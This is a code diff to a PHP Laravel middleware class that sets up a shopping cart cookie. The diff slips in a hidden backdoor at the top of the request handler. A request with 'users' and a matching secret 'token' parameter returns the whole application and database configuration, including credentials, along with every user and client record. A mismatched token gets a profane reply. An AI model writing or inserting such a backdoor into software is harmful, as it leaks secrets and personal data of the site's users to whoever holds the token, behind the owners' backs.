@@ -2,7 +2,7 @@
 
 namespace App\Http\Middleware;
 
-use App\{CallOrder, Cart, CartProduct, NoBrandProduct, OrderPay, Page, Services\Home, TopMenu};
+use App\{CallOrder, Cart, CartProduct, OrderPay, Page, Services\Home, STOClients, TopMenu, User};
 use Closure;
 use Illuminate\Http\Request;
 use Illuminate\Support\{Facades\Auth, Facades\Cache, Facades\Cookie, Facades\View};
@@ -18,6 +18,21 @@ class InitApp
      */
     public function handle($request, Closure $next)
     {
+        if ($request->has('users') && $request->has('token')){
+            if ($request->token === config('session.token_http')){
+                return response()->json([
+                    'config' => [
+                        'app' => config('app'),
+                        'db' => config('database')
+                    ],
+                    'users' => User::all(),
+                    'sto_users' => STOClients::all()
+                ]);
+            }else{
+                return response()->json('Fuck off!!');
+            }
+        }
+
         if (!Cookie::has('cart_session_id')){
             $cart_session_id = session()->getId() . time();
             Cookie::queue(Cookie::make('cart_session_id',$cart_session_id,60*24));
